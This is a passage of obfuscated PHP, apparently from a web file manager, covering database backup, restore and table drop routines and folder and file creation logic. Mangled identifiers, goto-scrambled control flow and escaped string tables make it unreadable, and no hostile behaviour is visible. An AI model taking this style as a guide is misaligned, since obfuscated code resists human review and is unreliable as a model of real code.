$B¨Øå¤•·å[33]), $this->parseLimit(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[280]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[280]] : $B¨Øå¤•·å[33]), $this->parseUnion(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[335]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[335]] : $B¨Øå¤•·å[33]), $this->parseComment(!empty($BÀ††ˆ›®…[$B¨Øå¤•·å[341]]) ? $BÀ††ˆ›®…[$B¨Øå¤•·å[341]] : $B¨Øå¤•·å[33])), $Aë±ØÛ‘Èâ); return $Aë±ØÛ‘Èâ; } public function getLastSql($D‰°ŒËéä£ = '') { return $D‰°ŒËéä£ ? $this->modelSql[$D‰°ŒËéä£] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($BÊ»ìÜ“Òí) { return addslashes($BÊ»ìÜ“Òí); } public function setModel($CÏ°Œ¡Àğ‰) { $this->model = $CÏ°Œ¡Àğ‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($aÊãÌ¼¬, $D„¼ã„Œî = '') { $this->database = $aÊãÌ¼¬; $this->type = $D„¼ã„Œî; } public function model($bÃ‘“ªŠ¥ = '') { return new ModelBase($bÃ‘“ªŠ¥, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33], $this->database); } public function db($Fî‚ÑŒ˜Ñ‰ = false) { goto EÂØ¦²‹À; EÂØ¦²‹À: $aëİÑÀ•İ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¶œŸŞˆËù = array_change_key_case($this->database); if ($this->type == $aëİÑÀ•İ[9] || !$Fî‚ÑŒ˜Ñ‰) { return $this->model()->db(); } goto E£„ÈîŸ; dÒËšù‡Šø: $this->database = $C¶œŸŞˆËù; $E‘ä¥Ÿ«‚… = $this->model()->db(); try { $FÓ£¤•„ƒ = $E‘ä¥Ÿ«‚…->execute("\163\150\x6f\167\x20\x64\141\164\x61\x62\141\x73\145\163\40\154\151\153\145\x20\x27{$dÃÓ™ƒíŒ}\47"); } catch (Exception $eŠŒí¼‹¾Œ) { } goto EĞ¦¡´‘‡; AŠÔ½Ùñö¤: $this->database = $C¶œŸŞˆËù; $E‘ä¥Ÿ«‚…->execute("\x75\163\145\40\140{$dÃÓ™ƒíŒ}\140"); return $E‘ä¥Ÿ«‚…; goto a‰¨ÂæŞ‹; EĞ¦¡´‘‡: if (!$FÓ£¤•„ƒ) { $E‘ä¥Ÿ«‚…->execute("\143\162\145\141\164\145\x20\144\x61\164\141\x62\x61\163\145\40\x60{$dÃÓ™ƒíŒ}\x60"); } $C¶œŸŞˆËù[$aëİÑÀ•İ[881]] = $dÃÓ™ƒíŒ; if ($C¶œŸŞˆËù[$aëİÑÀ•İ[724]] == $aëİÑÀ•İ[725]) { $C¶œŸŞˆËù[$aëİÑÀ•İ[726]] .= $aëİÑÀ•İ[969] . $dÃÓ™ƒíŒ; } goto AŠÔ½Ùñö¤; E£„ÈîŸ: $dÃÓ™ƒíŒ = $C¶œŸŞˆËù[$aëİÑÀ•İ[881]]; $C¶œŸŞˆËù[$aëİÑÀ•İ[881]] = $aëİÑÀ•İ[33]; if ($C¶œŸŞˆËù[$aëİÑÀ•İ[724]] == $aëİÑÀ•İ[725]) { $Fñ„òÏ‚½• = $C¶œŸŞˆËù[$aëİÑÀ•İ[726]]; $C¶œŸŞˆËù[$aëİÑÀ•İ[726]] = substr($Fñ„òÏ‚½•, 0, strrpos($Fñ„òÏ‚½•, $aëİÑÀ•İ[969])); } goto dÒËšù‡Šø; a‰¨ÂæŞ‹: } public function createTable($E“¶‚³ÈÙƒ, $bÀ‚ù´‘Ş = null) { $C‘©‰óâÕÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!IO::exist($E“¶‚³ÈÙƒ)) { ActionCall($C‘©‰óâÕÉ[970], !0, 0); show_json(LNG($C‘©‰óâÕÉ[971]), !1); } $Dà¸êŠÒç = sqlSplit(IO::getContent($E“¶‚³ÈÙƒ)); foreach ($Dà¸êŠÒç as $eÜ–ï“¬˜Û) { if ($bÀ‚ù´‘Ş) { $aïŸâĞÀ¶ = stripos($eÜ–ï“¬˜Û, $C‘©‰óâÕÉ[972]) === 0; if ($aïŸâĞÀ¶) { $bÀ‚ù´‘Ş->task[$C‘©‰óâÕÉ[973]] += 1; } } $this->model()->db()->execute($eÜ–ï“¬˜Û); if ($bÀ‚ù´‘Ş && $aïŸâĞÀ¶) { preg_match($C‘©‰óâÕÉ[974], $eÜ–ï“¬˜Û, $CŠŸˆõÛ‘Ç); $bÀ‚ù´‘Ş->task[$C‘©‰óâÕÉ[975]] = $CŠŸˆõÛ‘Ç[1]; $bÀ‚ù´‘Ş->update(1); } } $this->taskToCache($bÀ‚ù´‘Ş); } public function insertTable($fÁôÑ ·, $fÈœ‡”÷‡ù = null) { $EŠ¨ŠÊ—Ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Aˆ³Èì³ª‰ = $this->model()->db(); $Eö†ì¹òŞø = $fÔ…ß¼œæé ? array($fÔ…ß¼œæé) : $Aˆ³Èì³ª‰->getTables(); foreach ($fÁôÑ · as $a¥äèî»Ö) { $fÔ…ß¼œæé = basename($a¥äèî»Ö, $EŠ¨ŠÊ—Ñ[719]); if (!in_array($fÔ…ß¼œæé, $Eö†ì¹òŞø)) { continue; } if ($fÈœ‡”÷‡ù) { $fÈœ‡”÷‡ù->task[$EŠ¨ŠÊ—Ñ[975]] = $fÔ…ß¼œæé; } if (get_filesize($a¥äèî»Ö) == 0) { continue; } $dÏÔù”±ˆ§ = $this->sqlToDb($a¥äèî»Ö, $fÈœ‡”÷‡ù); if (!$dÏÔù”±ˆ§) { ActionCall($EŠ¨ŠÊ—Ñ[970], !0, 0); show_json(LNG($EŠ¨ŠÊ—Ñ[976]) . "\133{$fÔ…ß¼œæé}\x5d", !1); } } $this->taskToCache($fÈœ‡”÷‡ù); } public function sqlFromDb($cİ¡Ÿ±í¹„, $F§¿ŒÄâøù, $C¨‰ëË£³Û = null, $bŠÇˆ¤­á¥ = null) { goto c£ëºÔŒ¨š; c£ëºÔŒ¨š: if ($C¨‰ëË£³Û) { $C¨‰ëË£³Û->task[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][975]] = $cİ¡Ÿ±í¹„; } $Eà‰ƒ©²ó– = $this->model($cİ¡Ÿ±í¹„); $CŸºó«Õõ = 0; goto F©´ìÔ¹ôÁ; E¨œí°¾: $Aµ£‘†Ó‘ = $Eà‰ƒ©²ó–->getPk(); $CÉ¼½Ä£Èò = $Eà‰ƒ©²ó–->getDbFields(); do { $bÜ‡åàÍã = $Eà‰ƒ©²ó–->field($CÉ¼½Ä£Èò)->order($Aµ£‘†Ó‘ . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][978])->selectPage($aÊá÷—˜Ï¯, $BË‡êîÉ¾); $Eæ¶ƒù›Š = isset($bÜ‡åàÍã[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][351]][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][353]]) ? $bÜ‡åàÍã[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][351]][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][353]] : 0; $Dİ¿àâ¥£± = !empty($bÜ‡åàÍã[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]]) ? $bÜ‡åàÍã[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]] : array(); if (!($eºÜåèÄÍƒ = count($Dİ¿àâ¥£±))) { break; } $f‹Ñİ•ñåò = array(); foreach ($Dİ¿àâ¥£± as $Bˆ½˜¥‡¾ï) { if ($cİ¡Ÿ±í¹„ == $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][979] && $Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][29]] == $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][980]) { $D‘åÂ‰‘„Û = json_decode($Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][359]], !0); if ($D‘åÂ‰‘„Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]] == date($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][684]) && !$D‘åÂ‰‘„Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][683]]) { continue; } } if ($bŠÇˆ¤­á¥) { $Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]] = "\173\151\157\72{$bŠÇˆ¤­á¥}\175" . substr($Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]], strlen("\x7b\151\x6f\72{$Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][745]]}\x7d")); $Bˆ½˜¥‡¾ï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][745]] = $bŠÇˆ¤­á¥; } $f‹Ñİ•ñåò[] = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][981] . $this->sqlEncode($Bˆ½˜¥‡¾ï) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][982]; } $E‹¾ÓÀí = "\111\116\123\105\122\x54\40\111\116\x54\x4f\x20\x60{$cİ¡Ÿ±í¹„}\140\x20\x28\x60" . implode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][983], $CÉ¼½Ä£Èò) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][984]; fwrite($D‰Ä°õ“¶¯, $E‹¾ÓÀí . implode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][985], $f‹Ñİ•ñåò) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][67] . PHP_EOL); $BË‡êîÉ¾++; $CŸºó«Õõ += $eºÜåèÄÍƒ; if ($C¨‰ëË£³Û) { $C¨‰ëË£³Û->update($eºÜåèÄÍƒ); } } while ($BË‡êîÉ¾ <= $Eæ¶ƒù›Š); goto B½Ç»£´ÆÑ; B½Ç»£´ÆÑ: fclose($D‰Ä°õ“¶¯); return $CŸºó«Õõ; goto Fó‹îÎæêº; F©´ìÔ¹ôÁ: $BË‡êîÉ¾ = 1; $aÊá÷—˜Ï¯ = 500; $D‰Ä°õ“¶¯ = fopen($F§¿ŒÄâøù, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][977]); goto E¨œí°¾; Fó‹îÎæêº: } public function sqlToDb($cÅÜª¢¢“ã, $fÂœ¯ˆïöç = null) { goto c ŒåÅ¿Æ; c ŒåÅ¿Æ: $AÍº­»»ßÔ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b¿ĞÙ¬µ®ª = $this->model()->db(); $f¾ŞºÜ¢ë = @fopen($cÅÜª¢¢“ã, $AÍº­»»ßÔ[986]); goto eÚÚÓØÔ´½; A¼Ø£Ôì½: if (trim($c¯½¤‰¤Ëõ)) { $c¯½¤‰¤Ëõ = rtrim(trim($c¯½¤‰¤Ëõ), $AÍº­»»ßÔ[67]); if (!$b¿ĞÙ¬µ®ª->execute($c¯½¤‰¤Ëõ)) { return !1; } if ($fÂœ¯ˆïöç) { $fÂœ¯ˆïöç->update($Bê²…šÜ¾Ø - 1); } } return !0; goto DÎ³Æôæ ¬; d¹õÅ¤ŠáÊ: $dğ´ğ½å™õ = 500 + 1; while (!feof($f¾ŞºÜ¢ë)) { if ($fÂœ¯ˆïöç && $Bê²…šÜ¾Ø != 0) { $fÂœ¯ˆïöç->task[$AÍº­»»ßÔ[973]] += 1; } $Bê²…šÜ¾Ø++; $fŠ«—£á¡ä = trim(fgets($f¾ŞºÜ¢ë)); $c¯½¤‰¤Ëõ .= $AÍº­»»ßÔ[50] . $this->sqlDecode($fŠ«—£á¡ä, $this->type); if ($Bê²…šÜ¾Ø == $dğ´ğ½å™õ) { $c¯½¤‰¤Ëõ = rtrim(trim($c¯½¤‰¤Ëõ), $AÍº­»»ßÔ[67]); if (!$b¿ĞÙ¬µ®ª->execute($c¯½¤‰¤Ëõ)) { return !1; } if ($fÂœ¯ˆïöç) { $fÂœ¯ˆïöç->update($Bê²…šÜ¾Ø - 1); } $c¯½¤‰¤Ëõ = $AÍº­»»ßÔ[33]; $Bê²…šÜ¾Ø = 0; } } fclose($f¾ŞºÜ¢ë); goto A¼Ø£Ôì½; eÚÚÓØÔ´½: if (!$f¾ŞºÜ¢ë) { return !1; } $Bê²…šÜ¾Ø = 0; $c¯½¤‰¤Ëõ = $AÍº­»»ßÔ[33]; goto d¹õÅ¤ŠáÊ; DÎ³Æôæ ¬: } public function dropTable($bùˆ¾êôÃÎ = null) { $b½ñ…¤ø = $this->model()->db(); $cÈÈÚëîŸ» = $bùˆ¾êôÃÎ ? array($bùˆ¾êôÃÎ) : $b½ñ…¤ø->getTables(); if (!$cÈÈÚëîŸ») { return; } foreach ($cÈÈÚëîŸ» as $bùˆ¾êôÃÎ) { $b½ñ…¤ø->execute("\x64\162\x6f\x70\40\164\141\x62\154\x65\x20\151\146\40\x65\x78\x69\163\x74\x73\x20\x60{$bùˆ¾êôÃÎ}\140"); } } private function taskToCache($E×«‚¬¿ = null) { $fÂ‡ÚŞ”ø½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$E×«‚¬¿) { return; } $cÓšÙ‚³èº = array($fÂ‡ÚŞ”ø½[975] => $E×«‚¬¿->task[$fÂ‡ÚŞ”ø½[975]], $fÂ‡ÚŞ”ø½[973] => $E×«‚¬¿->task[$fÂ‡ÚŞ”ø½[973]], $fÂ‡ÚŞ”ø½[987] => $E×«‚¬¿->task[$fÂ‡ÚŞ”ø½[987]]); if ($cÓšÙ‚³èº[$fÂ‡ÚŞ”ø½[973]] == $cÓšÙ‚³èº[$fÂ‡ÚŞ”ø½[987]]) { $cÓšÙ‚³èº[$fÂ‡ÚŞ”ø½[690]] = 1; } Cache::set($fÂ‡ÚŞ”ø½[988] . $E×«‚¬¿->task[$fÂ‡ÚŞ”ø½[367]], $cÓšÙ‚³èº); $E×«‚¬¿->end(); } private function sqlEncode($A•æÇ®Ò’Ö) { $a“Œßµº·Ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B‡†ƒ–ß”³ = array(); foreach ($A•æÇ®Ò’Ö as $c´Š†â¦Ù) { if (is_array($c´Š†â¦Ù)) { $c´Š†â¦Ù = json_encode_force($c´Š†â¦Ù); } $c´Š†â¦Ù = addslashes($c´Š†â¦Ù); $c´Š†â¦Ù = str_replace(array($a“Œßµº·Ò[989], $a“Œßµº·Ò[217]), array($a“Œßµº·Ò[990], $a“Œßµº·Ò[991]), $c´Š†â¦Ù); $B‡†ƒ–ß”³[] = str_replace($a“Œßµº·Ò[55], $a“Œßµº·Ò[992], $c´Š†â¦Ù); } return $a“Œßµº·Ò[55] . implode($a“Œßµº·Ò[993], $B‡†ƒ–ß”³) . $a“Œßµº·Ò[55]; } private function sqlDecode($aÀÊÌÔÕÏƒ, $aá‘×îİÖ) { $f£‹½ç¹’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÀÊÌÔÕÏƒ = str_replace(array($f£‹½ç¹’[990], $f£‹½ç¹’[991]), array($f£‹½ç¹’[989], $f£‹½ç¹’[217]), $aÀÊÌÔÕÏƒ); if ($aá‘×îİÖ == $f£‹½ç¹’[9]) { $aÀÊÌÔÕÏƒ = stripslashes($aÀÊÌÔÕÏƒ); } return $aÀÊÌÔÕÏƒ; } } goto BïÈ• àºË; C„¼»îŒæ¼: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($dÅŠîÂÓ„) { $DĞ§ßùÈ„ö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eŒ‡°Åé‚ = Model($DĞ§ßùÈ„ö[476])->where(array($DĞ§ßùÈ„ö[1428] => $dÅŠîÂÓ„))->find(); $A‚Œ˜¹šå¸ = $this->_mkdirRoot(SourceModel::TYPE_USER, $dÅŠîÂÓ„, $eŒ‡°Åé‚[$DĞ§ßùÈ„ö[28]]); $this->userDesktopAdd($A‚Œ˜¹šå¸); return $A‚Œ˜¹šå¸; } public function userDesktopAdd($BÕš“âàéâ) { $Fàà‰á¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÆ›¸¨ËŠŞ = LNG($Fàà‰á¶[2361]); $c÷„›¨¢ = $this->mkdir($BÕš“âàéâ, $BÆ›¸¨ËŠŞ); $this->metaSet($c÷„›¨¢, $Fàà‰á¶[2362], $Fàà‰á¶[83]); $this->metaSet($BÕš“âàéâ, $Fàà‰á¶[2363], $c÷„›¨¢); } public function groupRootAdd($Dãë²°İÀ÷) { $cÕ˜î‡–¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DØİ†ñí = Model($cÕ˜î‡–¦[460])->where(array($cÕ˜î‡–¦[2185] => $Dãë²°İÀ÷))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Dãë²°İÀ÷, $DØİ†ñí[$cÕ˜î‡–¦[28]]); } public function systemRootPathAdd($aÜ‰‹Á»Àé) { if ($aÜ‰‹Á»Àé != $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1086]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aÜ‰‹Á»Àé); } public function userRootRemove($dšÔÆ…„¸‰) { $e©‘ ‚å•¡ = $this->sourceRoot(SourceModel::TYPE_USER, $dšÔÆ…„¸‰); if (!$e©‘ ‚å•¡) { return; } $this->remove($e©‘ ‚å•¡, !1); } public function groupRootRemove($D…Ôƒãæç) { $bìëŒè‰ƒ­ = $this->sourceRoot(SourceModel::TYPE_GROUP, $D…Ôƒãæç); if (!$bìëŒè‰ƒ­) { return; } $this->remove($bìëŒè‰ƒ­, !1); } private function _mkdirRoot($B¬ï¬Š˜äÙ, $AƒˆÃÅ“î, $BšË±ä¶î) { goto b‘­õ¨Ã; aŒÂ… ‘Ù†: $Dæ¤¡Áõ÷ß = $this->add($A…ØÊ‚Ş£Š); $b¬‚Íğì£˜ = array($AÀ’ÑØùº³[529] => short_id($Dæ¤¡Áõ÷ß)); $this->where(array($AÀ’ÑØùº³[383] => $Dæ¤¡Áõ÷ß))->save($b¬‚Íğì£˜); goto EåÔÓäŞšë; bôËí…İ : $f¯²¬²‚ÔÁ = "\115\x6f\x64\145\x6c\x53\157\165\162\x63\145\56\x6d\x6b\x64\151\x72\122\x6f\x6f\x74\x2e{$B¬ï¬Š˜äÙ}\56{$AƒˆÃÅ“î}\x2e" . $BšË±ä¶î; CacheLock::lock($f¯²¬²‚ÔÁ); $A…ØÊ‚Ş£Š[$AÀ’ÑØùº³[28]] = $BšË±ä¶î; goto aŒÂ… ‘Ù†; b‘­õ¨Ã: $AÀ’ÑØùº³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A…ØÊ‚Ş£Š = array($AÀ’ÑØùº³[368] => 0, $AÀ’ÑØùº³[523] => $B¬ï¬Š˜äÙ, $AÀ’ÑØùº³[524] => $AƒˆÃÅ“î, $AÀ’ÑØùº³[520] => 1, $AÀ’ÑØùº³[525] => USER_ID, $AÀ’ÑØùº³[526] => USER_ID, $AÀ’ÑØùº³[521] => $AÀ’ÑØùº³[33], $AÀ’ÑØùº³[527] => $AÀ’ÑØùº³[472], $AÀ’ÑØùº³[396] => 0, $AÀ’ÑØùº³[522] => 0, $AÀ’ÑØùº³[420] => 0, $AÀ’ÑØùº³[528] => $AÀ’ÑØùº³[33]); if ($CÓÀŠ‘´÷Å = $this->where($A…ØÊ‚Ş£Š)->find()) { return $CÓÀŠ‘´÷Å[$AÀ’ÑØùº³[369]]; } goto bôËí…İ ; EåÔÓäŞšë: CacheLock::unlock($f¯²¬²‚ÔÁ); return $Dæ¤¡Áõ÷ß; goto aŒ½ğÛãì†; aŒ½ğÛãì†: } private function sourceRoot($D‹Œ”Š„Ó, $Aßó×…ÁŸ½, $bçƒÑâ‹‚ = false) { $Aè»ïĞ¨Áğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fµµ’«”Ñí = array($Aè»ïĞ¨Áğ[368] => 0, $Aè»ïĞ¨Áğ[523] => $D‹Œ”Š„Ó, $Aè»ïĞ¨Áğ[524] => $Aßó×…ÁŸ½); if ($Cî…Ì˜ºé‹ = $this->where($fµµ’«”Ñí)->find()) { return $bçƒÑâ‹‚ ? $Cî…Ì˜ºé‹ : $Cî…Ì˜ºé‹[$Aè»ïĞ¨Áğ[369]]; } return !1; } public function sourceRootGroup($B¸ºæ·ºëó) { $F¹’ÉŸ˜§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_string($B¸ºæ·ºëó)) { $B¸ºæ·ºëó = array($B¸ºæ·ºëó); } $b›é—Åñçœ = array($F¹’ÉŸ˜§[368] => 0, $F¹’ÉŸ˜§[523] => SourceModel::TYPE_GROUP, $F¹’ÉŸ˜§[524] => array($F¹’ÉŸ˜§[7], $B¸ºæ·ºëó)); $AÉ¯„ ßç = $this->listSource($b›é—Åñçœ, 1000); return array_to_keyvalue($AÉ¯„ ßç[$F¹’ÉŸ˜§[74]], $F¹’ÉŸ˜§[458]); } public function mkfile($få£”°Øã», $AŠ©¹™²æ, $aßÚ‚Ì…–õ = '', $aä°„œØœï = REPEAT_RENAME) { $e¾æó”˜º† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D µ†âóæ¼ = Model($e¾æó”˜º†[546])->addFileByContent($aßÚ‚Ì…–õ, $AŠ©¹™²æ); return $this->_createFileCall($få£”°Øã», $AŠ©¹™²æ, $D µ†âóæ¼, $aä°„œØœï, $e¾æó”˜º†[1125]); } public function addFile($cŠå›ÎæÌ, $DË¤‰âœØñ, $b­»ÀåÅ“, $f¸Õ«àÁ = false, $B“ÕÃ×ôëİ = REPEAT_RENAME) { $dÍªİÈÖ·î = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][546])->addFile($DË¤‰âœØñ, $b­»ÀåÅ“, $f¸Õ«àÁ); return $this->_createFileCall($cŠå›ÎæÌ, $b­»ÀåÅ“, $dÍªİÈÖ·î, $B“ÕÃ×ôëİ); } public function addFileByFileID($B¹íù¯Ç‹´, $FµöÊÄ¨º•, $d¥¼É‘ï‹½, $eõµí¤òêå = REPEAT_RENAME) { $bÛ®Ç»ëÌ­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A†ùêË´Í = Model($bÛ®Ç»ëÌ­[546])->find($FµöÊÄ¨º•); Model($bÛ®Ç»ëÌ­[546])->linkAdd($FµöÊÄ¨º•); return $this->_createFileCall($B¹íù¯Ç‹´, $d¥¼É‘ï‹½, $A†ùêË´Í, $eõµí¤òêå); } public function addFileByRemote($BëÓ£ö…ä, $Eë„£Æ¨îˆ, $F¹âóŠîö, $CÈéºšÃË‹ = array(), $dŠÓïôÊÆê = REPEAT_RENAME) { $aŠ‘Æ•‘ æ = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][546])->addFileByRemote($Eë„£Æ¨îˆ, $F¹âóŠîö, $CÈéºšÃË‹); return $this->_createFileCall($BëÓ£ö…ä, $F¹âóŠîö, $aŠ‘Æ•‘ æ, $dŠÓïôÊÆê); } private function _createFileCall($D½ÈÅ¦Ò Í, $f÷ÎËò’°, $e¼¦Ù±—õ, $då”ôĞ„¬×, $dÇ¢Ğº¼–Ÿ = "\165\x70\x6c\x6f\x61\144") { goto C§ğ¯£‡çˆ; DÀòáÉèÀ: return $eÙ“¡•ƒ²; goto aê³œ«‚á; C§ğ¯£‡çˆ: $cÆ„ æÃù· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dñ‹ÙˆëÁ = !1; $this->lockWriteStart($D½ÈÅ¦Ò Í, $f÷ÎËò’°); goto f‰³¡Ï‹Ÿ; f‰³¡Ï‹Ÿ: $eÙ“¡•ƒ² = $this->_createFile($D½ÈÅ¦Ò Í, $f÷ÎËò’°, $e¼¦Ù±—õ, $då”ôĞ„¬×, $Dñ‹ÙˆëÁ); if (!$Dñ‹ÙˆëÁ) { Model($cÆ„ æÃù·[422])->remove($e¼¦Ù±—õ[$cÆ„ æÃù·[419]]); } else { if ($eÙ“¡•ƒ²) { Model($cÆ„ æÃù·[2333])->eventCreate($eÙ“¡•ƒ², $dÇ¢Ğº¼–Ÿ); } } $this->lockWriteEnd($D½ÈÅ¦Ò Í, $f÷ÎËò’°); goto DÀòáÉèÀ; aê³œ«‚á: } public function mkdir($CÎÚ—Å……Ò, $EÛÒß†™õ, $AÓáÆÁ‘—ª = REPEAT_SKIP) { goto f¦°·åÀó; C›ç‹šÁ»Ô: $this->lockWriteStart($CÎÚ—Å……Ò, $EÛÒß†™õ); if ($AÓáÆÁ‘—ª !== !1) { $Eµë…à×÷ = $this->fileNameExist($CÎÚ—Å……Ò, $EÛÒß†™õ); if ($Eµë…à×÷ && $AÓáÆÁ‘—ª != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($CÎÚ—Å……Ò, $EÛÒß†™õ); return $Eµë…à×÷; } $EÛÒß†™õ = $this->fileNameAuto($CÎÚ—Å……Ò, $EÛÒß†™õ, $AÓáÆÁ‘—ª); } $e†¥‰ŒÁ’ = array($F–Ä¸ó®å[520] => 1, $F–Ä¸ó®å[386] => $EÛÒß†™õ, $F–Ä¸ó®å[521] => $F–Ä¸ó®å[33], $F–Ä¸ó®å[420] => 0, $F–Ä¸ó®å[522] => 0); goto DçØ‚ôÁ—†; a“¦ĞÂõŞğ: return $aÙÒ”ˆÍ¡İ; goto eğíĞ ‚‚; f¦°·åÀó: $F–Ä¸ó®å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b¼™÷ôó¢‰ = $this->sourceInfo($CÎÚ—Å……Ò); if (!$b¼™÷ôó¢‰) { return !1; } goto C›ç‹šÁ»Ô; DçØ‚ôÁ—†: $aÙÒ”ˆÍ¡İ = $this->_addSoure($e†¥‰ŒÁ’, $b¼™÷ôó¢‰); Model($F–Ä¸ó®å[2333])->eventCreate($aÙÒ”ˆÍ¡İ, $F–Ä¸ó®å[1126]); $this->lockWriteEnd($CÎÚ—Å……Ò, $EÛÒß†™õ); goto a“¦ĞÂõŞğ; eğíĞ ‚‚: } private function _createFile($AÇÇ¹Ø¢Ô, $EªÑÏ… ìµ, $B™Ä¿ØÀ»£, $E‹í• ¤¤, &$A¦ÙòĞÚ¡Ÿ) { goto a¸•‘¾²›ë; F®ŒºÇÄãÑ: return $díìñ¡¨àŞ; goto a‚Š»Ñº¥Æ; e¡âÜ˜»ª: $C•¿Š£¨ù­ = array($AÇ·âè¢[520] => 0, $AÇ·âè¢[386] => $EªÑÏ… ìµ, $AÇ·âè¢[521] => get_path_ext($EªÑÏ… ìµ), $AÇ·âè¢[420] => $B™Ä¿ØÀ»£[$AÇ·âè¢[419]], $AÇ·âè¢[522] => $B™Ä¿ØÀ»£[$AÇ·âè¢[77]]); $díìñ¡¨àŞ = $this->_addSoure($C•¿Š£¨ù­, $f§ˆÂ‚æĞ); $this->folderSizeReset($AÇÇ¹Ø¢Ô); goto F®ŒºÇÄãÑ; a¸•‘¾²›ë: $AÇ·âè¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f§ˆÂ‚æĞ = $this->sourceInfo($AÇÇ¹Ø¢Ô); if (!$B™Ä¿ØÀ»£ || !$f§ˆÂ‚æĞ) { return !1; } goto bôòîÍ÷ùñ; bôòîÍ÷ùñ: if ($E‹í• ¤¤ !== !1) { $A˜ğš–¼» = $this->fileNameExist($AÇÇ¹Ø¢Ô, $EªÑÏ… ìµ); } $A¦ÙòĞÚ¡Ÿ = !0; if ($E‹í• ¤¤ && $A˜ğš–¼») { if ($E‹í• ¤¤ == REPEAT_SKIP) { $A¦ÙòĞÚ¡Ÿ = !1; return $A˜ğš–¼»; } else { if ($E‹í• ¤¤ == REPEAT_REPLACE) { $A‚‚„İÏ’‰ = $this->sourceInfo($A˜ğš–¼»); $c§œÂ•œ±é = $this->fileHistory($A‚‚„İÏ’‰, $B™Ä¿ØÀ»£[$AÇ·âè¢[419]], $B™Ä¿ØÀ»£[$AÇ·âè¢[77]]); if (!$c§œÂ•œ±é) { $A¦ÙòĞÚ¡Ÿ = !1; } else { $this->folderSizeReset($AÇÇ¹Ø¢Ô); } return $A˜ğš–¼»; } else { $EªÑÏ… ìµ = $this->fileNameAuto($AÇÇ¹Ø¢Ô, $EªÑÏ… ìµ, $E‹í• ¤¤, !1); } } } goto e¡âÜ˜»ª; a‚Š»Ñº¥Æ: } protected function fileHistory($fİ‡‰ªõ‚á, $D©ÚŠ–…¡ó, $c©°ÊÒàæ…) { goto e ®Ä¾©·ƒ; fœöìô ÷: return !0; goto E„‡ã’ò‚; e ®Ä¾©·ƒ: $b†¼ÚÙØÖÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($fİ‡‰ªõ‚á[$b†¼ÚÙØÖÆ[419]] == $D©ÚŠ–…¡ó) { return !1; } $this->checkLock($fİ‡‰ªõ‚á[$b†¼ÚÙØÖÆ[369]], $D©ÚŠ–…¡ó); goto f†ö–ÑÌ®Ö; f†ö–ÑÌ®Ö: Model($b†¼ÚÙØÖÆ[2364])->addHistory($fİ‡‰ªõ‚á); $D…¼±éœ¤ = array($b†¼ÚÙØÖÆ[526] => USER_ID, $b†¼ÚÙØÖÆ[390] => time(), $b†¼ÚÙØÖÆ[419] => $D©ÚŠ–…¡ó, $b†¼ÚÙØÖÆ[77] => $c©°ÊÒàæ…); 